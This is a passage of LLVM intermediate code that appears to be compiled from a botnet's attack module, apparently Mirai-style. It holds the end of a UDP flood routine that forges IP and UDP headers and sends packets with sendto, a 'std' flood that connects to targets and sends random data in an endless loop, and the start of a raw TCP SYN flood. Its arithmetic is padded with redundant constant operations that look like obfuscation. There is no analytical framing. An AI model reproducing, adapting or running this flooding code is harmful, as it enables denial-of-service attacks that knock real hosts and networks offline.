  %404 = zext i16 %403 to i32
  %405 = icmp eq i32 %404, 65535
  br i1 %405, label %406, label %436

; <label>:406:                                    ; preds = %402
  %407 = call i32 @rand_next()
  %408 = xor i32 %407, -1
  %409 = xor i32 65535, -1
  %410 = xor i32 1615625300, -1
  %411 = or i32 %408, %409
  %412 = or i32 1615625300, %410
  %413 = xor i32 %411, -1
  %414 = and i32 %413, %412
  %415 = and i32 %407, 65535
  %416 = trunc i32 %414 to i16
  %417 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 3
  store i16 %416, i16* %418, align 4
  %419 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 3
  %421 = load i16, i16* %420, align 4
  %422 = zext i16 %421 to i32
  %423 = sub i32 %422, 1944331837
  %424 = sub i32 %423, 1000
  %425 = add i32 %424, 1944331837
  %426 = sub nsw i32 %422, 1000
  %427 = xor i32 %425, -1
  %428 = and i32 -1, %427
  %429 = xor i32 -1, -1
  %430 = and i32 %425, %429
  %431 = or i32 %428, %430
  %432 = xor i32 %425, -1
  %433 = trunc i32 %431 to i16
  %434 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  store i16 %433, i16* %435, align 4
  br label %436

; <label>:436:                                    ; preds = %406, %402
  %437 = load i16, i16* %16, align 2
  %438 = zext i16 %437 to i32
  %439 = icmp eq i32 %438, 65535
  br i1 %439, label %440, label %453

; <label>:440:                                    ; preds = %436
  %441 = call i32 @rand_next()
  %442 = xor i32 %441, -1
  %443 = xor i32 65535, -1
  %444 = xor i32 2063249141, -1
  %445 = or i32 %442, %443
  %446 = or i32 2063249141, %444
  %447 = xor i32 %445, -1
  %448 = and i32 %447, %446
  %449 = and i32 %441, 65535
  %450 = trunc i32 %448 to i16
  %451 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %452 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %451, i32 0, i32 0
  store i16 %450, i16* %452, align 2
  br label %453

; <label>:453:                                    ; preds = %440, %436
  %454 = load i16, i16* %17, align 2
  %455 = zext i16 %454 to i32
  %456 = icmp eq i32 %455, 65535
  br i1 %456, label %457, label %470

; <label>:457:                                    ; preds = %453
  %458 = call i32 @rand_next()
  %459 = xor i32 %458, -1
  %460 = xor i32 65535, -1
  %461 = xor i32 -2027282564, -1
  %462 = or i32 %459, %460
  %463 = or i32 -2027282564, %461
  %464 = xor i32 %462, -1
  %465 = and i32 %464, %463
  %466 = and i32 %458, 65535
  %467 = trunc i32 %465 to i16
  %468 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %469 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %468, i32 0, i32 1
  store i16 %467, i16* %469, align 2
  br label %470

; <label>:470:                                    ; preds = %457, %453
  %471 = load i8, i8* %20, align 1
  %472 = icmp ne i8 %471, 0
  br i1 %472, label %477, label %473

; <label>:473:                                    ; preds = %470
  %474 = call i32 @rand_next()
  %475 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 9
  store i32 %474, i32* %476, align 4
  br label %483

; <label>:477:                                    ; preds = %470
  %478 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 9
  %480 = load i32, i32* %479, align 4
  %481 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 9
  store i32 %480, i32* %482, align 4
  br label %483

; <label>:483:                                    ; preds = %477, %473
  %484 = call i32 @rand_next()
  store i32 %484, i32* %37, align 4
  %485 = call i32 @rand_next()
  store i32 %485, i32* %38, align 4
  %486 = call i32 @rand_next()
  store i32 %486, i32* %39, align 4
  %487 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %488 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %487, i32 0, i32 0
  %489 = getelementptr inbounds [6 x i8], [6 x i8]* %488, i32 0, i32 0
  %490 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %489, i8* %490, i32 4)
  %491 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %492 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %491, i32 0, i32 1
  %493 = getelementptr inbounds [6 x i8], [6 x i8]* %492, i32 0, i32 0
  %494 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %493, i8* %494, i32 4)
  %495 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %496 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %495, i32 0, i32 0
  %497 = getelementptr inbounds [6 x i8], [6 x i8]* %496, i32 0, i32 0
  %498 = getelementptr inbounds i8, i8* %497, i64 4
  %499 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %498, i8* %499, i32 2)
  %500 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %501 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %500, i32 0, i32 1
  %502 = getelementptr inbounds [6 x i8], [6 x i8]* %501, i32 0, i32 0
  %503 = getelementptr inbounds i8, i8* %502, i64 4
  %504 = bitcast i32* %39 to i8*
  %505 = getelementptr inbounds i8, i8* %504, i64 2
  call void @util_memcpy(i8* %503, i8* %505, i32 2)
  %506 = load i8, i8* %19, align 1
  %507 = icmp ne i8 %506, 0
  br i1 %507, label %508, label %511

; <label>:508:                                    ; preds = %483
  %509 = load i8*, i8** %36, align 8
  %510 = load i32, i32* %18, align 4
  call void @rand_str(i8* %509, i32 %510)
  br label %511

; <label>:511:                                    ; preds = %508, %483
  %512 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %513 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %512, i32 0, i32 7
  store i16 0, i16* %513, align 2
  %514 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %515 = bitcast %struct.iphdr* %514 to i16*
  %516 = call zeroext i16 @checksum_generic(i16* %515, i32 20)
  %517 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %518 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %517, i32 0, i32 7
  store i16 %516, i16* %518, align 2
  %519 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %520 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %519, i32 0, i32 7
  store i16 0, i16* %520, align 2
  %521 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %522 = bitcast %struct.iphdr* %521 to i16*
  %523 = call zeroext i16 @checksum_generic(i16* %522, i32 20)
  %524 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 7
  store i16 %523, i16* %525, align 2
  %526 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %527 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %526, i32 0, i32 3
  store i16 0, i16* %527, align 2
  %528 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %529 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %530 = bitcast %struct.udphdr* %529 to i8*
  %531 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %532 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %531, i32 0, i32 2
  %533 = load i16, i16* %532, align 2
  %534 = load i32, i32* %18, align 4
  %535 = sext i32 %534 to i64
  %536 = add i64 8, 6769484851673871059
  %537 = add i64 %536, %535
  %538 = sub i64 %537, 6769484851673871059
  %539 = add i64 8, %535
  %540 = trunc i64 %538 to i32
  %541 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %528, i8* %530, i16 zeroext %533, i32 %540)
  %542 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %543 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %542, i32 0, i32 3
  store i16 %541, i16* %543, align 2
  %544 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %545 = load i32, i32* %9, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %544, i64 %546
  %548 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %547, i32 0, i32 0
  %549 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %548, i32 0, i32 0
  store i16 2, i16* %549, align 4
  %550 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %551 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %550, i32 0, i32 9
  %552 = load i32, i32* %551, align 4
  %553 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %554 = load i32, i32* %9, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %553, i64 %555
  %557 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %556, i32 0, i32 0
  %558 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %557, i32 0, i32 2
  %559 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %558, i32 0, i32 0
  store i32 %552, i32* %559, align 4
  %560 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %561 = load i32, i32* %9, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %560, i64 %562
  %564 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %563, i32 0, i32 0
  %565 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %564, i32 0, i32 1
  store i16 0, i16* %565, align 2
  %566 = load i32, i32* %10, align 4
  %567 = load i8*, i8** %30, align 8
  %568 = load i32, i32* %18, align 4
  %569 = sext i32 %568 to i64
  %570 = add i64 66, -111636608000510960
  %571 = add i64 %570, %569
  %572 = sub i64 %571, -111636608000510960
  %573 = add i64 66, %569
  %574 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %575 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %576 = load i32, i32* %9, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %575, i64 %577
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %578, i32 0, i32 0
  %580 = bitcast %struct.sockaddr_in* %579 to %struct.sockaddr*
  store %struct.sockaddr* %580, %struct.sockaddr** %574, align 8
  %581 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %582 = load %struct.sockaddr*, %struct.sockaddr** %581, align 8
  %583 = call i64 @sendto(i32 %566, i8* %567, i64 %572, i32 16384, %struct.sockaddr* %582, i32 16)
  br label %584

; <label>:584:                                    ; preds = %511
  %585 = load i32, i32* %9, align 4
  %586 = sub i32 0, 1
  %587 = sub i32 %585, %586
  %588 = add nsw i32 %585, 1
  store i32 %587, i32* %9, align 4
  br label %334

; <label>:589:                                    ; preds = %334
  br label %333

; <label>:590:                                    ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %172, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %179

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %153

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 0, %141
  %143 = sub i32 %132, %142
  %144 = add i32 %132, %141
  %145 = call i32 @htonl(i32 %143) #7
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 0
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %150, i32 0, i32 2
  %152 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %151, i32 0, i32 0
  store i32 %145, i32* %152, align 4
  br label %153

; <label>:153:                                    ; preds = %125, %116
  %154 = load i32*, i32** %11, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i32, i32* %154, i64 %156
  %158 = load i32, i32* %157, align 4
  %159 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %160 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i64 %162
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %163, i32 0, i32 0
  %165 = bitcast %struct.sockaddr_in* %164 to %struct.sockaddr*
  store %struct.sockaddr* %165, %struct.sockaddr** %159, align 8
  %166 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %167 = load %struct.sockaddr*, %struct.sockaddr** %166, align 8
  %168 = call i32 @connect(i32 %158, %struct.sockaddr* %167, i32 16)
  %169 = icmp eq i32 %168, -1
  br i1 %169, label %170, label %171

; <label>:170:                                    ; preds = %153
  br label %171

; <label>:171:                                    ; preds = %170, %153
  br label %172

; <label>:172:                                    ; preds = %171
  %173 = load i32, i32* %9, align 4
  %174 = sub i32 0, %173
  %175 = sub i32 0, 1
  %176 = add i32 %174, %175
  %177 = sub i32 0, %176
  %178 = add nsw i32 %173, 1
  store i32 %177, i32* %9, align 4
  br label %58

; <label>:179:                                    ; preds = %58
  br label %180

; <label>:180:                                    ; preds = %214, %179
  store i32 0, i32* %9, align 4
  br label %181

; <label>:181:                                    ; preds = %208, %180
  %182 = load i32, i32* %9, align 4
  %183 = load i8, i8* %5, align 1
  %184 = zext i8 %183 to i32
  %185 = icmp slt i32 %182, %184
  br i1 %185, label %186, label %214

; <label>:186:                                    ; preds = %181
  %187 = load i8**, i8*** %10, align 8
  %188 = load i32, i32* %9, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds i8*, i8** %187, i64 %189
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %22, align 8
  %192 = load i8, i8* %15, align 1
  %193 = icmp ne i8 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %186
  %195 = load i8*, i8** %22, align 8
  %196 = load i16, i16* %14, align 2
  %197 = zext i16 %196 to i32
  call void @rand_str(i8* %195, i32 %197)
  br label %198

; <label>:198:                                    ; preds = %194, %186
  %199 = load i32*, i32** %11, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i32, i32* %199, i64 %201
  %203 = load i32, i32* %202, align 4
  %204 = load i8*, i8** %22, align 8
  %205 = load i16, i16* %14, align 2
  %206 = zext i16 %205 to i64
  %207 = call i64 @send(i32 %203, i8* %204, i64 %206, i32 16384)
  br label %208

; <label>:208:                                    ; preds = %198
  %209 = load i32, i32* %9, align 4
  %210 = sub i32 %209, -1011057638
  %211 = add i32 %210, 1
  %212 = add i32 %211, -1011057638
  %213 = add nsw i32 %209, 1
  store i32 %212, i32* %9, align 4
  br label %181

; <label>:214:                                    ; preds = %181
  br label %180
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %629

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
